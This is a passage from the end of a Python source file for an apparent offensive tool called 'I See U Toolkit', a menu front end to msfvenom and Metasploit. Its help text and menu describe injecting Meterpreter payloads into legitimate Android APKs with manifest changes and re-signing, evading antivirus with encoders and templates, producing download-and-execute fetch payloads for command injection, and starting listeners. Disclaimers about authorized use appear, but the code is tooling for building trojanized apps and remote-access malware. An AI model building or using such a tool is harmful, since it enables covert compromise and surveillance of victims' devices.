                print(f"{Colors.GREEN}✅ Preset saved as {preset_file}{Colors.END}")
            except IOError as e:
                print(f"{Colors.RED}❌ Failed to save preset: {e}{Colors.END}")
    
    def load_preset_config(self) -> None:
        """Load a preset configuration."""
        # List available presets
        presets = [f for f in os.listdir('.') if f.startswith('preset_') and f.endswith('.json')]
        
        if not presets:
            print(f"{Colors.RED}❌ No preset configurations found.{Colors.END}")
            return
        
        print(f"\n{Colors.CYAN}Available presets:{Colors.END}")
        for i, preset in enumerate(presets, 1):
            print(f"{Colors.YELLOW}{i}. {preset[7:-5]}{Colors.END}")  # Remove 'preset_' prefix and '.json' suffix
        
        while True:
            choice = input(f"{Colors.WHITE}Select preset: {Colors.END}").strip()
            try:
                preset_index = int(choice) - 1
                if 0 <= preset_index < len(presets):
                    preset_file = presets[preset_index]
                    try:
                        with open(preset_file, 'r') as f:
                            self.config = json.load(f)
                        print(f"{Colors.GREEN}✅ Preset '{preset_file[7:-5]}' loaded successfully{Colors.END}")
                        break
                    except (json.JSONDecodeError, IOError) as e:
                        print(f"{Colors.RED}❌ Failed to load preset: {e}{Colors.END}")
                        break
            except ValueError:
                pass
            print(f"{Colors.RED}Invalid choice. Please try again.{Colors.END}")
    
    def show_help(self) -> None:
        """Display help information."""
        help_text = f"""
{Colors.BOLD}{Colors.CYAN}I SEE U TOOLKIT v1.4 - HELP{Colors.END}
{Colors.BOLD}{Colors.YELLOW}OVERVIEW:{Colors.END}
    This tool generates Metasploit payloads with modern features and automatic terminal handling.
    It supports traditional payloads, fetch payloads, and multi-format generation.
{Colors.BOLD}{Colors.YELLOW}FEATURES:{Colors.END}
    • {Colors.GREEN}Traditional Payload Generation{Colors.END}: Standard msfvenom payloads with encoding
    • {Colors.GREEN}Fetch Payloads{Colors.END}: New payloads that generate download-and-execute commands
    • {Colors.GREEN}Multi-Format Generation{Colors.END}: Generate the same payload in multiple formats
    • {Colors.GREEN}Enhanced Android Support{Colors.END}: Compatibility with Android 10-15
    • {Colors.GREEN}Payload Injection{Colors.END}: Inject payload into original APK for better evasion
    • {Colors.GREEN}Advanced Evasion{Colors.END}: Template usage, multiple encoders, exe-only format
    • {Colors.GREEN}Automatic Terminal Handling{Colors.END}: Opens new terminal for Metasploit handler
    • {Colors.GREEN}Auto IP Detection{Colors.END}: Automatically detects system IP address
    • {Colors.GREEN}Staged/Non-staged Payloads{Colors.END}: Choose between staged and non-staged payloads
    • {Colors.GREEN}Configuration Management{Colors.END}: Save/load presets and default settings
    • {Colors.GREEN}Logging{Colors.END}: Detailed logging of all operations
{Colors.BOLD}{Colors.YELLOW}ANDROID PAYLOAD FIX:{Colors.END}
    • {Colors.GREEN}Fixed APK Format Issue{Colors.END}: Android payloads now use valid msfvenom formats
    • {Colors.GREEN}Payload Injection{Colors.END}: Injects payload into original APK for better compatibility
    • {Colors.GREEN}Proper Format Selection{Colors.END}: Choose from raw, elf, or elf-so formats
    • {Colors.GREEN}Better Error Handling{Colors.END}: Clear error messages for invalid formats
{Colors.BOLD}{Colors.YELLOW}PAYLOAD INJECTION:{Colors.END}
    • {Colors.GREEN}Original APK Integration{Colors.END}: Uses user-provided APK as a base
    • {Colors.GREEN}Smali Code Injection{Colors.END}: Injects payload startup code into main activity
    • {Colors.GREEN}Manifest Modification{Colors.END}: Adds required permissions and service
    • {Colors.GREEN}APK Signing{Colors.END}: Creates and uses signing keys for installable APKs
    • {Colors.GREEN}Works on Android 10-15{Colors.END}: Bypasses modern Android restrictions
{Colors.BOLD}{Colors.YELLOW}TERMINAL FEATURES:{Colors.END}
    • Automatically opens new terminal window for Metasploit handler
    • Supports multiple terminal emulators (xterm, gnome-terminal, konsole, etc.)
    • Configurable terminal title and window size
    • Falls back to background execution if no terminal is available
    • Opens xterm to show payload generation process
{Colors.BOLD}{Colors.YELLOW}AUTO IP DETECTION:{Colors.END}
    • Automatically detects your system's IP address
    • Uses multiple methods to ensure accurate IP detection
    • Fallback to manual entry if auto-detection fails
    • Can be disabled in settings
{Colors.BOLD}{Colors.YELLOW}STAGED vs NON-STAGED PAYLOADS:{Colors.END}
    • {Colors.GREEN}Staged Payloads{Colors.END}: Smaller initial payload that downloads additional stages
    • {Colors.YELLOW}Non-staged Payloads{Colors.END}: Single larger payload with all functionality included
    • Staged payloads are better for size-constrained environments
    • Non-staged payloads are more reliable but larger
{Colors.BOLD}{Colors.YELLOW}SECURITY NOTES:{Colors.END}
    • All inputs are sanitized and validated
    • Commands are executed with timeout and error handling
    • No hardcoded secrets or credentials
    • Logging for audit purposes
{Colors.BOLD}{Colors.YELLOW}PLATFORM SUPPORT:{Colors.END}
    • {Colors.GREEN}Windows{Colors.END}: x64, meterpreter/shell, exe/exe-only/dll/service
    • {Colors.GREEN}Linux{Colors.END}: x64, meterpreter/shell, elf/elf-so/raw
    • {Colors.GREEN}Android{Colors.END}: x64, meterpreter/shell/java, raw/elf/elf-so/injected APK
    • {Colors.GREEN}macOS{Colors.END}: x64/ARM64, meterpreter/shell, macho/raw
    • {Colors.GREEN}iOS{Colors.END}: ARM64, meterpreter, raw
{Colors.BOLD}{Colors.YELLOW}ENCODERS:{Colors.END}
    • {Colors.YELLOW}x86/shikata_ga_nai{Colors.END}: Polymorphic XOR encoder
    • {Colors.YELLOW}x64/xor_dynamic{Colors.END}: Dynamic XOR encoder for x64
    • {Colors.YELLOW}cmd/powershell_base64{Colors.END}: PowerShell base64 encoding
    • {Colors.YELLOW}generic/none{Colors.END}: No encoding
{Colors.BOLD}{Colors.YELLOW}FETCH PAYLOADS:{Colors.END}
    Fetch payloads generate commands that can be executed on remote systems
    to download and execute payloads automatically. They support HTTP, HTTPS,
    and TFTP protocols.
{Colors.BOLD}{Colors.YELLOW}USAGE TIPS:{Colors.END}
    • Use injected APKs for Android penetration testing
    • Use fetch payloads for command injection scenarios
    • Use custom templates for better evasion
    • Generate multiple formats for compatibility testing
    • Save configurations for repeated use
    • Configure terminal emulator settings for best experience
    • Enable auto IP detection for convenience
{Colors.BOLD}{Colors.YELLOW}ETHICAL WARNING:{Colors.END}
    This tool is for educational and authorized security testing only.
    Unauthorized use is illegal and unethical. Always obtain proper
    authorization before using this tool.
"""
        print(help_text)
    
    def display_banner(self) -> None:
        """Display the surveillance-themed ASCII art banner."""
        banner = f"""
{Colors.BOLD}{Colors.MAGENTA}
    ╔══════════════════════════════════════════════════════════════╗
    ║                         {Colors.RED}██╗{Colors.MAGENTA}                                   ║
    ║                         {Colors.RED}██║{Colors.MAGENTA}                                   ║
    ║                         {Colors.RED}██║{Colors.MAGENTA}                                   ║
    ║                         {Colors.RED}██║{Colors.MAGENTA}                                   ║
    ║                         {Colors.RED}██║{Colors.MAGENTA}                                   ║
    ║                         {Colors.RED}╚═╝{Colors.MAGENTA}                                   ║
    ║                                                                ║
    ║     {Colors.RED}███████╗{Colors.MAGENTA} {Colors.RED}███████╗{Colors.MAGENTA} {Colors.RED}███████╗{Colors.MAGENTA}                          ║
    ║     {Colors.RED}██╔════╝{Colors.MAGENTA} {Colors.RED}██╔════╝{Colors.MAGENTA} {Colors.RED}██╔════╝{Colors.MAGENTA}                          ║
    ║     {Colors.RED}███████╗{Colors.MAGENTA} {Colors.RED}█████╗  {Colors.MAGENTA} {Colors.RED}█████╗  {Colors.MAGENTA}                          ║
    ║     {Colors.RED}╚════██║{Colors.MAGENTA} {Colors.RED}██╔══╝  {Colors.MAGENTA} {Colors.RED}██╔══╝  {Colors.MAGENTA}                          ║
    ║     {Colors.RED}███████║{Colors.MAGENTA} {Colors.RED}███████╗{Colors.MAGENTA} {Colors.RED}███████╗{Colors.MAGENTA}                          ║
    ║     {Colors.RED}╚══════╝{Colors.MAGENTA} {Colors.RED}╚══════╝{Colors.MAGENTA} {Colors.RED}╚══════╝{Colors.MAGENTA}                          ║
    ║                                                                ║
    ║                         {Colors.RED}██╗   ██╗{Colors.MAGENTA}                             ║
    ║                         {Colors.RED}██║   ██║{Colors.MAGENTA}                             ║
    ║                         {Colors.RED}██║   ██║{Colors.MAGENTA}                             ║
    ║                         {Colors.RED}██║   ██║{Colors.MAGENTA}                             ║
    ║                         {Colors.RED}╚██████╔╝{Colors.MAGENTA}                             ║
    ║                         {Colors.RED}╚═════╝ {Colors.MAGENTA}                              ║
    ║                                                                ║
    ╚══════════════════════════════════════════════════════════════╝
    ║                      {Colors.BOLD}{Colors.CYAN}Advanced Payload Generation{Colors.END}              ║
    ║                {Colors.BOLD}{Colors.CYAN}With Auto IP Detection & Terminal Handling{Colors.END}           ║
    ╚══════════════════════════════════════════════════════════════╝
     ╔════════════════════════════════════════════════════════════╗
     ║  {Colors.YELLOW}👁️   I SEE YOU...{Colors.MAGENTA}                                            ║
     ║  {Colors.YELLOW}📹   Watching...{Colors.MAGENTA}                                              ║
     ║  {Colors.YELLOW}🎯   Targeting...{Colors.MAGENTA}                                             ║
     ║  {Colors.YELLOW}📡   Connecting...{Colors.MAGENTA}                                             ║
     ║  {Colors.YELLOW}🔓   Accessing...{Colors.MAGENTA}                                             ║
     ║  {Colors.YELLOW}💻   Terminal Opening...{Colors.MAGENTA}                                       ║
     ╚════════════════════════════════════════════════════════════╝
    ╔════════════════════════════════════════════════════════════╗
    ║  {Colors.BOLD}{Colors.RED}WARNING: FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY!{Colors.MAGENTA}        ║
    ║  {Colors.BOLD}{Colors.RED}UNAUTHORIZED USE IS ILLEGAL AND UNETHICAL.{Colors.MAGENTA}                   ║
    ║  {Colors.BOLD}{Colors.RED}ALWAYS OBTAIN PROPER AUTHORIZATION.{Colors.MAGENTA}                          ║
    ╚════════════════════════════════════════════════════════════╝
{Colors.END}
        """
        print(banner)
    
    def display_menu(self) -> None:
        """Display the main menu."""
        print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'='*50}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}I SEE U TOOLKIT - MAIN MENU{Colors.END}")
        print(f"{Colors.BOLD}{Colors.MAGENTA}{'='*50}{Colors.END}")
        print(f"{Colors.YELLOW}1. Generate Traditional Payload{Colors.END}")
        print(f"{Colors.YELLOW}2. Inject Payload into Original APK{Colors.END}")
        print(f"{Colors.YELLOW}3. Generate Fetch Payload{Colors.END}")
        print(f"{Colors.YELLOW}4. Generate Multi-Format Payload{Colors.END}")
        print(f"{Colors.YELLOW}5. Start Meterpreter Listener{Colors.END}")
        print(f"{Colors.YELLOW}6. Configure Settings{Colors.END}")
        print(f"{Colors.YELLOW}7. Configure Terminal Settings{Colors.END}")
        print(f"{Colors.YELLOW}8. Load Preset Configuration{Colors.END}")
        print(f"{Colors.YELLOW}9. Save Current Configuration{Colors.END}")
        print(f"{Colors.YELLOW}10. View Help{Colors.END}")
        print(f"{Colors.RED}0. Exit{Colors.END}")
        print(f"{Colors.BOLD}{Colors.MAGENTA}{'='*50}{Colors.END}")
    
    def run(self) -> None:
        """Main application loop."""
        self.display_banner()
        
        while True:
            self.display_menu()
            choice = input(f"\n{Colors.WHITE}Enter your choice (0-10): {Colors.END}").strip()
            
            if choice == "1":
                self.generate_traditional_payload()
            elif choice == "2":
                self.generate_injected_android_payload()
            elif choice == "3":
                self.generate_fetch_payload()
            elif choice == "4":
                self.generate_multi_format_payload()
            elif choice == "5":
                self.start_meterpreter_listener()
            elif choice == "6":
                self.configure_settings()
            elif choice == "7":
                self.configure_terminal_settings()
            elif choice == "8":
                self.load_preset_config()
            elif choice == "9":
                self.save_preset_config()
            elif choice == "10":
                self.show_help()
            elif choice == "0":
                print(f"\n{Colors.GREEN}Thank you for using I See U Toolkit!{Colors.END}")
                print(f"{Colors.YELLOW}Remember to use this tool responsibly and ethically.{Colors.END}")
                break
            else:
                print(f"{Colors.RED}Invalid choice. Please try again.{Colors.END}")
            
            # Pause for readability
            input(f"\n{Colors.WHITE}Press Enter to continue...{Colors.END}")

def main():
    """Main entry point."""
    try:
        toolkit = ISeeUToolkit()
        toolkit.run()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}Operation cancelled by user.{Colors.END}")
        sys.exit(0)
    except Exception as e:
        logger.error(f"Unexpected error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()